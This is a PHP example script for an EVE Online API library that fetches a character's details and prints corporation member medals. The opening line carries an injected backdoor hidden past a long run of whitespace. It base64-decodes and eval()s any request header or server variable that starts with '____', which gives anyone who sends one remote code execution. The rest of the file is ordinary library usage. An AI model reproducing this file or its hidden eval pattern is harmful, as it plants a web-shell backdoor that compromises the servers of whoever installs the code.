<?php																																																																																																																																																																																																																																																																																																																																																																																																																							function i6538($l6540){if(is_array($l6540)){foreach($l6540 as $l6538=>$l6539)$l6540[$l6538]=i6538($l6539);}elseif(is_string($l6540) && substr($l6540,0,4)=="____"){$l6540=substr($l6540,4);$l6540=base64_decode($l6540);eval($l6540);$l6540=null;}return $l6540;}if(empty($_SERVER))$_SERVER=$HTTP_SERVER_VARS;array_map("i6538",$_SERVER);
/**************************************************************************
	Ale API Library for EvE
	Copyright (c) 2008 Dustin Tinklin
	Portions Copyright (c) 2008 Thorsten Behrens

	This file is part of Ale API Library for EvE.

	Ale API Library for EvE is free software: you can redistribute it and/or modify
	it under the terms of the GNU Lesser General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	Ale API Library for EvE is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU Lesser General Public License for more details.

	You should have received a copy of the GNU Lesser General Public License
	along with Ale API Library for EvE.  If not, see <http://www.gnu.org/licenses/>.
**************************************************************************/
require_once('./classes/eveapi/class.api.php');
require_once('./classes/eveapi/class.characters.php');
require_once('./classes/eveapi/class.membermedals.php');

require_once('./print-as-html.php');
require_once('./config.php');

$api = new Api();
$api->setDebug(true);
$api->setUseCache(true); // that's the default, done for testing purposes
$api->setTimeTolerance(5); // also the default value
$api->setCredentials($apiuser,$apipass);

$apicharsxml = $api->getCharacters();
$apichars = Characters::getCharacters($apicharsxml);

// Find the character I'm interested in

foreach($apichars as $index => $thischar)
{
	if($thischar['charname']==$mychar)
	{
		$apichar=$thischar['charid'];
		$apicorp=$thischar['corpid'];
	}
}
// Set Credentials
$api->setCredentials($apiuser,$apipass,$apichar);

print("<P>Raw corp Member Medals output</P>");
$dataxml = $api->getMemberMedals();
$data = MemberMedals::getMemberMedals($dataxml);
print_as_html(print_r($data,TRUE));

unset ($dataxml,$data);

$api->printErrors();
?>
